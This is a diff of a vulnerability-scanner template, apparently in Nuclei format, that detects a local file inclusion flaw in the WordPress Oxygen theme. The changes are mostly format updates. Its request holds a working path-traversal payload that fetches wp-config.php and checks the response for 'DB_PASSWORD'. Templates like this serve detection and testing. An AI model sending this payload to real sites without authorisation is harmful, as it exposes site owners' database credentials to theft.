@@ -1,4 +1,5 @@
 id: wp-oxygen-theme-lfi
+
 info:
   name: WordPress Oxygen-Theme - Local File Inclusion
   author: 0x_Akoko
@@ -10,11 +11,15 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
     cwe-id: CWE-22
-  tags: wordpress,wp-theme,lfi
-requests:
+  metadata:
+    max-request: 1
+  tags: wordpress,wp-theme,lfi,vuln
+
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php'
+
     matchers-condition: and
     matchers:
       - type: word
@@ -23,8 +28,8 @@ requests:
           - "DB_PASSWORD"
         part: body
         condition: and
+
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/07/29
+# digest: 4b0a00483046022100a441464b9d21300b37fbad9413c03b50cdd525884bc76b4990925fa4faa0e8d2022100a1d04e6c4a60f745eab5296d8dadf7708522b4cd0504f5612e78b3a1be103e64:922c64590222798bb761d5b6d8e72950
